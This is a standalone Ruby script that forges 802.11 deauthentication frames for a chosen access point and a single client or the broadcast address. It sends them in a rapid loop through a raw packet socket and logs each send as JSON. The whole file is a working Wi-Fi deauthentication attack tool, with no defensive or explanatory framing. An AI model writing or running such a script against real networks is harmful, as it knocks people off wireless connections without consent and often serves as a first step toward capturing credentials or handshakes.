#!/usr/bin/env ruby
# frozen_string_literal: true

require 'socket'
require 'json'
require 'time'

ETH_P_ALL = [0x0003].pack('n').unpack1('S')

REASON_CODES = {
  1 => 'unspecified', 4 => 'inactivity', 5 => 'ap_unable',
  6 => 'class2_frame', 7 => 'class3_frame', 8 => 'leaving_bss',
  9 => 'not_authenticated'
}.freeze

def mac2bin(s)
  s.split(':').map { |b| b.to_i(16).chr }.join
end

def if_nametoindex(name)
  Socket.getifaddrs.select { |a| a.name == name }.first&.ifindex
end

def build_deauth(bssid, station, seq, reason)
  fc = [0xc0, 0x00].pack('C*')
  dur = [0x013a].pack('v')
  sc = [seq << 4].pack('v')
  reason_code = [reason].pack('v')
  fc + dur + station + bssid + bssid + sc + reason_code
end

begin
  iface = ARGV[0]
  bssid = mac2bin(ARGV[1] || '00:11:22:33:44:55')
  station_raw = ARGV[2] || 'broadcast'
  station = station_raw == 'broadcast' ? "\xff\xff\xff\xff\xff\xff" : mac2bin(station_raw)
  count = (ARGV[3] || 1).to_i
  reason = (ARGV[4] || 7).to_i

  raise 'interface required' unless iface
  ifidx = if_nametoindex(iface)
  raise "interface #{iface} not found" unless ifidx
  raise "reason #{reason} out of range" if reason < 0 || reason > 65535

  sock = Socket.new(Socket::PF_PACKET, Socket::SOCK_RAW, ETH_P_ALL)
  sent_total = 0

  count.times do |i|
    seq = rand(0..4095)
    frame = build_deauth(bssid, station, seq, reason)
    addr = Socket.pack_sockaddr_ll(ETH_P_ALL, ifidx, 0, 0, 0, '')
    sent = sock.send(frame, 0, addr)
    sent_total += 1

    puts JSON.generate({
      event: 'deauth', iface: iface,
      bssid: ARGV[1] || '00:11:22:33:44:55',
      ssid: '', channel: 0,
      data: { seq: seq, bytes: sent, sent_count: sent_total,
              total_target: count, reason: reason,
              reason_desc: REASON_CODES[reason] || 'unknown',
              station: station_raw },
      timestamp: Time.now.iso8601
    })
    $stdout.flush
    sleep(0.001) if count > 1
  end

  sock.close

  puts JSON.generate({
    event: 'deauth_complete', iface: iface,
    bssid: ARGV[1] || '00:11:22:33:44:55',
    ssid: '', channel: 0,
    data: { sent: sent_total, reason: reason,
            station: station_raw },
    timestamp: Time.now.iso8601
  })
  $stdout.flush

rescue Interrupt
  puts JSON.generate({ event: 'deauth', iface: iface || '',
    data: { status: 'interrupted', sent: sent_total || 0 },
    timestamp: Time.now.iso8601 })
rescue => e
  $stderr.puts JSON.generate({ event: 'error', data: { message: e.message,
    backtrace: e.backtrace&.first }, timestamp: Time.now.iso8601 })
  exit 1
end
